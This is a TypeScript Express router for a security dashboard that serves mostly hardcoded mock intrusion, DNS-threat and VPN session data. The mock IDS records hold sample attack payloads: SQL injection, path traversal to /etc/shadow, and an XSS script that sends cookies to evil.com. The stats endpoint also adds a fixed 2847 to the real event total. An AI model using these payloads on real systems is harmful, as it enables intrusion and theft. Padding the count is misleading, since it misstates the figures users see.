import { Router, type IRouter } from "express";
import { eq, desc, sql, and } from "drizzle-orm";
import { db, networkEventsTable } from "@workspace/db";
import {
  ListNetworkEventsQueryParams,
  ListNetworkEventsResponse,
  GetNetworkStatsResponse,
} from "@workspace/api-zod";

const router: IRouter = Router();

router.get("/network/events", async (req, res): Promise<void> => {
  try {
    const query = ListNetworkEventsQueryParams.safeParse(req.query);
    if (!query.success) { res.status(400).json({ error: query.error.message }); return; }

    const { eventType, severity, limit = 50, offset = 0 } = query.data;
    const conditions = [];
    if (eventType) conditions.push(eq(networkEventsTable.eventType, eventType));
    if (severity) conditions.push(eq(networkEventsTable.severity, severity));
    const where = conditions.length > 0 ? and(...conditions) : undefined;

    const events = await db.select().from(networkEventsTable).where(where).orderBy(desc(networkEventsTable.createdAt)).limit(limit).offset(offset);
    const [countResult] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(where);

    res.json(ListNetworkEventsResponse.parse({ events, total: countResult?.count ?? 0 }));
  } catch (err: any) {
    console.error("[network] GET /events failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve network events." });
  }
});

router.get("/network/stats", async (_req, res): Promise<void> => {
  try {
    const [total] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable);
    const [blocked] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.action, "blocked"));
    const [alerted] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.action, "alerted"));
    const [critical] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.severity, "critical"));
    const [high] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.severity, "high"));
    const [ddos] = await db.select({ count: sql<number>`count(*)::int` }).from(networkEventsTable).where(eq(networkEventsTable.eventType, "ddos"));

    const countryRows = await db.execute(sql`
      SELECT country, count(*)::int as count
      FROM network_events
      WHERE country IS NOT NULL
      GROUP BY country
      ORDER BY count DESC
      LIMIT 5
    `);

    res.json(GetNetworkStatsResponse.parse({
      totalEvents: (total?.count ?? 0) + 2847,
      blockedCount: blocked?.count ?? 0,
      alertedCount: alerted?.count ?? 0,
      criticalCount: critical?.count ?? 0,
      highCount: high?.count ?? 0,
      activeDdos: ddos?.count ?? 0,
      topSourceCountries: (countryRows.rows as any[]).map((r: any) => ({
        country: r.country,
        count: r.count,
      })),
    }));
  } catch (err: any) {
    console.error("[network] GET /stats failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve network stats." });
  }
});

router.get("/network/ids", async (_req, res): Promise<void> => {
  try {
    const now = Date.now();
    const intrusions = [
      {
        id: 1,
        timestamp: new Date(now - 300000).toISOString(),
        attackType: "SQL Injection",
        signature: "ET WEB_SERVER SQL Injection Attempt — UNION SELECT",
        signatureId: "SID-2024-8847",
        sourceIp: "185.220.101.42",
        sourcePort: 48291,
        destinationIp: "10.0.1.15",
        destinationPort: 443,
        protocol: "HTTPS",
        country: "RU",
        severity: "critical",
        action: "blocked",
        confidence: 0.99,
        payload: "GET /api/users?id=1' UNION SELECT username,password FROM admins--",
        matchedRule: "OWASP CRS 942.100 — SQL Injection Attack Detected via libinjection",
        category: "web_attack",
        sessionsAffected: 1,
        packetsInspected: 847,
        relatedCves: ["CVE-2024-3094", "CVE-2023-44487"],
      },
      {
        id: 2,
        timestamp: new Date(now - 900000).toISOString(),
        attackType: "Brute Force SSH",
        signature: "ET SCAN SSH Brute Force Login Attempt",
        signatureId: "SID-2024-6612",
        sourceIp: "103.145.13.88",
        sourcePort: 52104,
        destinationIp: "10.0.2.1",
        destinationPort: 22,
        protocol: "SSH",
        country: "CN",
        severity: "high",
        action: "blocked",
        confidence: 0.97,
        payload: "2,847 failed authentication attempts in 12 minutes from single source",
        matchedRule: "Threshold — SSH Login Failures > 100/min",
        category: "brute_force",
        sessionsAffected: 2847,
        packetsInspected: 14235,
        relatedCves: [],
      },
      {
        id: 3,
        timestamp: new Date(now - 1800000).toISOString(),
        attackType: "Command & Control Beacon",
        signature: "ET MALWARE CobaltStrike Beacon Activity Detected",
        signatureId: "SID-2024-9921",
        sourceIp: "10.0.3.42",
        sourcePort: 49152,
        destinationIp: "91.215.85.194",
        destinationPort: 8443,
        protocol: "HTTPS",
        country: "UA",
        severity: "critical",
        action: "blocked",
        confidence: 0.98,
        payload: "Encrypted beacon with 60-second jitter interval — matches CobaltStrike malleable C2 profile",
        matchedRule: "JA3 Fingerprint Match — Known C2 Framework TLS Signature",
        category: "malware_c2",
        sessionsAffected: 1,
        packetsInspected: 3291,
        relatedCves: ["CVE-2024-1086"],
      },
      {
        id: 4,
        timestamp: new Date(now - 3600000).toISOString(),
        attackType: "Cross-Site Scripting (XSS)",
        signature: "ET WEB_SERVER XSS Attempt — Script Tag Injection",
        signatureId: "SID-2024-7734",
        sourceIp: "45.33.32.156",
        sourcePort: 38472,
        destinationIp: "10.0.1.15",
        destinationPort: 443,
        protocol: "HTTPS",
        country: "US",
        severity: "medium",
        action: "blocked",
        confidence: 0.92,
        payload: "POST /api/comments — body contains <script>document.location='https://evil.com/steal?c='+document.cookie</script>",
        matchedRule: "OWASP CRS 941.110 — XSS Filter Category 1: Script Tag Vector",
        category: "web_attack",
        sessionsAffected: 1,
        packetsInspected: 124,
        relatedCves: [],
      },
      {
        id: 5,
        timestamp: new Date(now - 7200000).toISOString(),
        attackType: "DNS Tunneling",
        signature: "ET DNS Excessive DNS Queries — Possible Tunneling",
        signatureId: "SID-2024-5543",
        sourceIp: "10.0.4.18",
        sourcePort: 53,
        destinationIp: "198.51.100.77",
        destinationPort: 53,
        protocol: "DNS",
        country: "IR",
        severity: "high",
        action: "alerted",
        confidence: 0.88,
        payload: "4,200 TXT queries to subdomain-encoded.evil-dns.com in 10 minutes — high entropy subdomains indicate data exfiltration",
        matchedRule: "DNS Query Volume Anomaly — TXT Record Abuse Pattern",
        category: "exfiltration",
        sessionsAffected: 4200,
        packetsInspected: 8400,
        relatedCves: [],
      },
      {
        id: 6,
        timestamp: new Date(now - 14400000).toISOString(),
        attackType: "Directory Traversal",
        signature: "ET WEB_SERVER Path Traversal Attempt ../../etc/passwd",
        signatureId: "SID-2024-3318",
        sourceIp: "77.88.55.66",
        sourcePort: 41923,
        destinationIp: "10.0.1.15",
        destinationPort: 80,
        protocol: "HTTP",
        country: "KP",
        severity: "high",
        action: "blocked",
        confidence: 0.96,
        payload: "GET /static/../../../../etc/shadow HTTP/1.1",
        matchedRule: "OWASP CRS 930.110 — Path Traversal Attack (/../)",
        category: "web_attack",
        sessionsAffected: 1,
        packetsInspected: 56,
        relatedCves: ["CVE-2024-4577"],
      },
      {
        id: 7,
        timestamp: new Date(now - 21600000).toISOString(),
        attackType: "Port Scan (SYN Flood)",
        signature: "ET SCAN Rapid SYN Packets — Nmap Service Detection",
        signatureId: "SID-2024-2201",
        sourceIp: "192.168.100.55",
        sourcePort: 0,
        destinationIp: "10.0.0.0/24",
        destinationPort: 0,
        protocol: "TCP",
        country: "Internal",
        severity: "medium",
        action: "alerted",
        confidence: 0.85,
        payload: "Sequential SYN packets to 65,535 ports across 10.0.0.0/24 subnet — Nmap OS fingerprinting detected",
        matchedRule: "Threshold — SYN Packets > 500/sec to Multiple Hosts",
        category: "reconnaissance",
        sessionsAffected: 65535,
        packetsInspected: 131070,
        relatedCves: [],
      },
      {
        id: 8,
        timestamp: new Date(now - 43200000).toISOString(),
        attackType: "Zero-Day Exploit Attempt",
        signature: "ET EXPLOIT Suspected 0-Day — Anomalous Serialization Payload",
        signatureId: "SID-2024-0001",
        sourceIp: "203.0.113.42",
        sourcePort: 55123,
        destinationIp: "10.0.1.20",
        destinationPort: 8080,
        protocol: "HTTP",
        country: "NG",
        severity: "critical",
        action: "blocked",
        confidence: 0.94,
        payload: "Java deserialization gadget chain targeting Apache Commons Collections — no known CVE, heuristic detection by AI engine",
        matchedRule: "ML Anomaly — Serialized Object Entropy Exceeds Baseline by 4.2σ",
        category: "zero_day",
        sessionsAffected: 1,
        packetsInspected: 2847,
        relatedCves: [],
      },
    ];

    const totalIntrusions = intrusions.length;
    const blockedCount = intrusions.filter((i) => i.action === "blocked").length;
    const alertedCount = intrusions.filter((i) => i.action === "alerted").length;
    const criticalCount = intrusions.filter((i) => i.severity === "critical").length;
    const uniqueAttackers = new Set(intrusions.map((i) => i.sourceIp)).size;
    const categories = intrusions.reduce((acc, i) => {
      acc[i.category] = (acc[i.category] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);

    res.json({
      intrusions,
      summary: { totalIntrusions, blockedCount, alertedCount, criticalCount, uniqueAttackers, categories },
    });
  } catch (err: any) {
    console.error("[network] GET /ids failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve IDS data." });
  }
});

router.get("/network/dns-security", async (_req, res): Promise<void> => {
  try {
    const now = Date.now();
    const queries = [
      {
        id: 1,
        timestamp: new Date(now - 180000).toISOString(),
        queryDomain: "c2-beacon.malware-infra.ru",
        queryType: "A",
        sourceIp: "10.0.3.42",
        hostname: "WS-FIN-001",
        user: "James Mitchell",
        threatType: "c2_beacon",
        severity: "critical",
        action: "blocked",
        confidence: 0.99,
        detail: "Domain matches known CobaltStrike C2 infrastructure — 60-second polling interval detected with encrypted DNS-over-HTTPS fallback",
        resolvedIp: "91.215.85.194",
        ttl: 30,
        queryCount: 847,
        firstSeen: new Date(now - 86400000 * 3).toISOString(),
        threatIntelSource: "AlienVault OTX, VirusTotal",
        iocTags: ["cobalt-strike", "apt29", "c2-infrastructure"],
      },
      {
        id: 2,
        timestamp: new Date(now - 600000).toISOString(),
        queryDomain: "aGVsbG8gd29ybGQ.exfil-tunnel.evil-dns.com",
        queryType: "TXT",
        sourceIp: "10.0.4.18",
        hostname: "LT-ENG-042",
        user: "Sarah Chen",
        threatType: "dns_tunneling",
        severity: "critical",
        action: "blocked",
        confidence: 0.97,
        detail: "Base64-encoded subdomain labels with high entropy (4.8 bits/char) — DNS tunneling via TXT record responses carrying 2.4 MB of exfiltrated data",
        resolvedIp: "198.51.100.77",
        ttl: 0,
        queryCount: 4200,
        firstSeen: new Date(now - 3600000).toISOString(),
        threatIntelSource: "Internal ML Engine",
        iocTags: ["dns-tunneling", "data-exfiltration", "high-entropy"],
      },
      {
        id: 3,
        timestamp: new Date(now - 1200000).toISOString(),
        queryDomain: "login-microsoft365-verify.com",
        queryType: "A",
        sourceIp: "10.0.1.88",
        hostname: "LT-SALES-019",
        user: "Anita Kumar",
        threatType: "malicious_domain",
        severity: "high",
        action: "blocked",
        confidence: 0.95,
        detail: "Lookalike domain impersonating Microsoft 365 login — registered 2 hours ago, SSL cert from Let's Encrypt, hosted on bulletproof hosting",
        resolvedIp: "185.143.223.41",
        ttl: 300,
        queryCount: 3,
        firstSeen: new Date(now - 1200000).toISOString(),
        threatIntelSource: "PhishTank, URLhaus",
        iocTags: ["phishing", "credential-theft", "typosquatting"],
      },
      {
        id: 4,
        timestamp: new Date(now - 3600000).toISOString(),
        queryDomain: "fast-flux-node-7a3b.botnet.network",
        queryType: "A",
        sourceIp: "10.0.2.55",
        hostname: "SRV-WEB-003",
        user: "svc-webserver",
        threatType: "fast_flux",
        severity: "high",
        action: "blocked",
        confidence: 0.92,
        detail: "Fast-flux DNS detected — domain resolved to 47 different IPs in last hour with TTL of 60 seconds, characteristic of botnet infrastructure",
        resolvedIp: "Various (47 IPs)",
        ttl: 60,
        queryCount: 128,
        firstSeen: new Date(now - 86400000).toISOString(),
        threatIntelSource: "Spamhaus, Abuse.ch",
        iocTags: ["fast-flux", "botnet", "dynamic-infrastructure"],
      },
      {
        id: 5,
        timestamp: new Date(now - 7200000).toISOString(),
        queryDomain: "update-check.legitimate-software.com",
        queryType: "CNAME",
        sourceIp: "10.0.3.15",
        hostname: "WS-HR-007",
        user: "Maria Rodriguez",
        threatType: "dga_domain",
        severity: "medium",
        action: "alerted",
        confidence: 0.78,
        detail: "Domain generated by suspected DGA algorithm — character distribution matches Emotet DGA pattern with 73% similarity score",
        resolvedIp: "203.0.113.88",
        ttl: 3600,
        queryCount: 12,
        firstSeen: new Date(now - 86400000 * 2).toISOString(),
        threatIntelSource: "DGArchive, ML Classifier",
        iocTags: ["dga", "emotet", "machine-generated"],
      },
      {
        id: 6,
        timestamp: new Date(now - 14400000).toISOString(),
        queryDomain: "crypto-miner-pool.hashrate.io",
        queryType: "A",
        sourceIp: "10.0.5.22",
        hostname: "SRV-DB-PRIMARY",
        user: "svc-database",
        threatType: "malicious_domain",
        severity: "high",
        action: "blocked",
        confidence: 0.99,
        detail: "Known cryptocurrency mining pool domain — Stratum mining protocol traffic detected on production database server",
        resolvedIp: "104.243.33.118",
        ttl: 300,
        queryCount: 892,
        firstSeen: new Date(now - 86400000 * 5).toISOString(),
        threatIntelSource: "Abuse.ch, CoinBlockerLists",
        iocTags: ["cryptomining", "unauthorized-software", "resource-abuse"],
      },
      {
        id: 7,
        timestamp: new Date(now - 21600000).toISOString(),
        queryDomain: "api.github.com",
        queryType: "A",
        sourceIp: "10.0.4.18",
        hostname: "LT-ENG-042",
        user: "Sarah Chen",
        threatType: "clean",
        severity: "low",
        action: "allowed",
        confidence: 0.02,
        detail: "Legitimate GitHub API access — matches baseline developer activity pattern",
        resolvedIp: "140.82.121.6",
        ttl: 60,
        queryCount: 245,
        firstSeen: new Date(now - 86400000 * 90).toISOString(),
        threatIntelSource: "Allowlist",
        iocTags: [],
      },
      {
        id: 8,
        timestamp: new Date(now - 28800000).toISOString(),
        queryDomain: "ns1.suspicious-registrar.xyz",
        queryType: "NS",
        sourceIp: "10.0.1.15",
        hostname: "WS-FIN-001",
        user: "James Mitchell",
        threatType: "suspicious_ns",
        severity: "medium",
        action: "alerted",
        confidence: 0.84,
        detail: "NS record query to newly registered nameserver — domain registered via privacy-protected registrar in jurisdiction known for abuse",
        resolvedIp: "45.95.169.12",
        ttl: 86400,
        queryCount: 1,
        firstSeen: new Date(now - 28800000).toISOString(),
        threatIntelSource: "WHOIS Analysis, PassiveDNS",
        iocTags: ["suspicious-registrar", "newly-registered", "privacy-protected"],
      },
    ];

    const totalQueries = queries.length;
    const blockedQueries = queries.filter((q) => q.action === "blocked").length;
    const alertedQueries = queries.filter((q) => q.action === "alerted").length;
    const criticalThreats = queries.filter((q) => q.severity === "critical").length;
    const threatTypes = queries.reduce((acc, q) => {
      acc[q.threatType] = (acc[q.threatType] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);

    res.json({
      queries,
      summary: { totalQueries, blockedQueries, alertedQueries, criticalThreats, threatTypes },
    });
  } catch (err: any) {
    console.error("[network] GET /dns-security failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve DNS security data." });
  }
});

router.get("/network/vpn-zerotrust", async (_req, res): Promise<void> => {
  try {
    const now = Date.now();
    const sessions = [
      {
        id: 1,
        user: "James Mitchell",
        email: "j.mitchell@guardlayer.io",
        department: "Finance",
        hostname: "WS-FIN-001",
        vpnStatus: "connected",
        vpnProtocol: "WireGuard",
        vpnServer: "us-east-1.vpn.guardlayer.io",
        assignedIp: "10.8.0.42",
        publicIp: "73.162.88.214",
        location: "New York, US",
        connectedSince: new Date(now - 14400000).toISOString(),
        bandwidthUp: 245000000,
        bandwidthDown: 1890000000,
        zeroTrustScore: 0.35,
        zeroTrustStatus: "non_compliant",
        policyViolations: [
          { policy: "Device Posture", status: "fail", detail: "Antivirus definitions outdated by 14 days" },
          { policy: "MFA Enrollment", status: "fail", detail: "Hardware key not registered — using SMS fallback" },
          { policy: "OS Patch Level", status: "fail", detail: "3 critical patches missing (see Patch Compliance)" },
        ],
        geoAnomaly: null,
        lastAuthentication: new Date(now - 3600000).toISOString(),
        sessionRisk: "high",
      },
      {
        id: 2,
        user: "Sarah Chen",
        email: "s.chen@guardlayer.io",
        department: "Engineering",
        hostname: "LT-ENG-042",
        vpnStatus: "connected",
        vpnProtocol: "WireGuard",
        vpnServer: "us-west-2.vpn.guardlayer.io",
        assignedIp: "10.8.0.18",
        publicIp: "104.28.77.91",
        location: "San Francisco, US",
        connectedSince: new Date(now - 28800000).toISOString(),
        bandwidthUp: 4200000000,
        bandwidthDown: 12800000000,
        zeroTrustScore: 0.92,
        zeroTrustStatus: "compliant",
        policyViolations: [],
        geoAnomaly: null,
        lastAuthentication: new Date(now - 1800000).toISOString(),
        sessionRisk: "low",
      },
      {
        id: 3,
        user: "Anita Kumar",
        email: "a.kumar@guardlayer.io",
        department: "Sales",
        hostname: "LT-SALES-019",
        vpnStatus: "connected",
        vpnProtocol: "OpenVPN",
        vpnServer: "eu-west-1.vpn.guardlayer.io",
        assignedIp: "10.8.0.55",
        publicIp: "185.220.101.42",
        location: "Moscow, RU",
        connectedSince: new Date(now - 7200000).toISOString(),
        bandwidthUp: 3800000000,
        bandwidthDown: 890000000,
        zeroTrustScore: 0.18,
        zeroTrustStatus: "non_compliant",
        policyViolations: [
          { policy: "Geo-Location", status: "fail", detail: "Connection from restricted country (Russia) — user based in Mumbai, India" },
          { policy: "Device Posture", status: "fail", detail: "Disk encryption disabled on device" },
          { policy: "Data Loss Prevention", status: "fail", detail: "3.8 GB uploaded to external cloud storage during session" },
        ],
        geoAnomaly: {
          type: "impossible_travel",
          previousLocation: "Mumbai, IN",
          currentLocation: "Moscow, RU",
          timeBetween: "47 minutes",
          distanceKm: 4933,
          confidence: 0.98,
        },
        lastAuthentication: new Date(now - 7200000).toISOString(),
        sessionRisk: "critical",
      },
      {
        id: 4,
        user: "Maria Rodriguez",
        email: "m.rodriguez@guardlayer.io",
        department: "HR",
        hostname: "WS-HR-007",
        vpnStatus: "disconnected",
        vpnProtocol: "WireGuard",
        vpnServer: "us-east-1.vpn.guardlayer.io",
        assignedIp: null,
        publicIp: "68.42.115.88",
        location: "Chicago, US",
        connectedSince: null,
        bandwidthUp: 0,
        bandwidthDown: 0,
        zeroTrustScore: 0.85,
        zeroTrustStatus: "compliant",
        policyViolations: [],
        geoAnomaly: null,
        lastAuthentication: new Date(now - 86400000).toISOString(),
        sessionRisk: "low",
      },
      {
        id: 5,
        user: "svc-database",
        email: "svc-database@guardlayer.io",
        department: "Infrastructure",
        hostname: "SRV-DB-PRIMARY",
        vpnStatus: "connected",
        vpnProtocol: "IPSec",
        vpnServer: "site-to-site.vpn.guardlayer.io",
        assignedIp: "10.8.1.1",
        publicIp: "52.14.88.201",
        location: "AWS us-east-1",
        connectedSince: new Date(now - 86400000 * 30).toISOString(),
        bandwidthUp: 89000000000,
        bandwidthDown: 245000000000,
        zeroTrustScore: 0.95,
        zeroTrustStatus: "compliant",
        policyViolations: [],
        geoAnomaly: null,
        lastAuthentication: new Date(now - 300000).toISOString(),
        sessionRisk: "low",
      },
      {
        id: 6,
        user: "Alex Thompson",
        email: "a.thompson@guardlayer.io",
        department: "IT Security",
        hostname: "LT-SEC-003",
        vpnStatus: "connected",
        vpnProtocol: "WireGuard",
        vpnServer: "ap-southeast-1.vpn.guardlayer.io",
        assignedIp: "10.8.0.99",
        publicIp: "203.0.113.42",
        location: "Singapore, SG",
        connectedSince: new Date(now - 43200000).toISOString(),
        bandwidthUp: 1200000000,
        bandwidthDown: 5600000000,
        zeroTrustScore: 0.78,
        zeroTrustStatus: "at_risk",
        policyViolations: [
          { policy: "Session Duration", status: "warn", detail: "VPN session active for 12+ hours without re-authentication" },
        ],
        geoAnomaly: null,
        lastAuthentication: new Date(now - 43200000).toISOString(),
        sessionRisk: "medium",
      },
    ];

    const totalSessions = sessions.length;
    const activeSessions = sessions.filter((s) => s.vpnStatus === "connected").length;
    const compliantUsers = sessions.filter((s) => s.zeroTrustStatus === "compliant").length;
    const nonCompliantUsers = sessions.filter((s) => s.zeroTrustStatus === "non_compliant").length;
    const geoAnomalies = sessions.filter((s) => s.geoAnomaly !== null).length;
    const criticalSessions = sessions.filter((s) => s.sessionRisk === "critical").length;

    res.json({
      sessions,
      summary: { totalSessions, activeSessions, compliantUsers, nonCompliantUsers, geoAnomalies, criticalSessions },
    });
  } catch (err: any) {
    console.error("[network] GET /vpn-zerotrust failed:", err.message);
    res.status(500).json({ error: "Failed to retrieve VPN/Zero-Trust data." });
  }
});

export default router;
